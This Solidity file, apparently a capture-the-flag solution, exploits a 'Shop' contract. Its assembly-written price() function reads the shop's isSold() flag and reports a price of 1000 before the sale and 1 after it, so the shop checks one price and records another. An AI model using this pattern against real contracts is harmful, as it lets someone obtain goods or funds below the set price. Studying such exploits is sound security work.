// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Shop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract ShopExploit {
    function exploit(address shop) external {
        // Shop(shop).buy();
        assembly {
            mstore(0, "buy()")
            mstore(0, keccak256(0, 5))
            let success := call(gas(), shop, 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function price() external view returns (uint256) {
        // if (Shop(msg.sender).isSold()) return 1;
        // return 1000;
        assembly {
            mstore(0, "isSold()")
            mstore(0, keccak256(0, 8))
            pop(staticcall(gas(), caller(), 0, 4, 0, 0x20))
            switch eq(mload(0), true)
            case 1 {
                mstore(0, 1)
            }
            case 0 {
                mstore(0, 1000)
            }

            return(0, 0x20)
        }
    }
}
